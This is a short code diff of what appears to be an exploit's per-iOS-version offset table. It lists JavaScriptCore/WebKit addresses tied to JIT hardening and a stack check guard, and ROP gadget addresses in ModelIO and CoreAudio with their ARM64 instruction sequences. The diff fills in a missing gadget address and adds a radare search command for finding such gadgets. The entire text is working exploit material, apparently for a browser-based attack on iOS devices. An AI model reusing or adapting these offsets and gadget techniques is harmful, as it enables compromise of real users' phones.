@@ -35,7 +35,7 @@ var Offsets = function Offsets(sw_vers, productname) {
         jit_writeseperateheaps_func: 0x1b31a10c8, //From JSCore
         usefastpermissions_jitcopy: 0x1b1bf0018, //From JSCore (JIT hardening)
         ptr_stack_check_guard: 0x1ac2f7c40, //From JSCore
-        modelio_popx8: 0, //From ModelIO
+        modelio_popx8: 0x18d2f6574, //From ModelIO
                                     //   ldr x8, [sp, #0x28]
                                     //   ldr x0, [x8, #0x18]
                                     //   ldp x29, x30, [sp, #0x50]
@@ -64,12 +64,7 @@ var Offsets = function Offsets(sw_vers, productname) {
         jit_writeseperateheaps_func: 0x1b335d0c8, //From Webkit
         usefastpermissions_jitcopy: 0x1b1d04018, //From Webkit (JIT hardening)
         ptr_stack_check_guard: 0x1ac3efc40, //From Webkit
-        modelio_popx8: 0x18d2f6564, //From ModelIO
-                                    //   ldr x8, [sp, #0x28]
-                                    //   ldr x0, [x8, #0x18]
-                                    //   ldp x29, x30, [sp, #0x50]
-                                    //   add sp, sp, #0x60
-                                    //   ret
+        modelio_popx8: 0x18d2f6564, //Use radare: "/c ldr x8, [sp, 0x28]; ldr x0, [x8, 0x18]; ldp x29, x30, [sp, 0x50]; add sp, sp, 0x60; ret"
         coreaudio_popx2: 0x18409ddbc,   //From CoreAudio
                                         //   ldr x2, [sp, #8]
                                         //   mov x0, x2
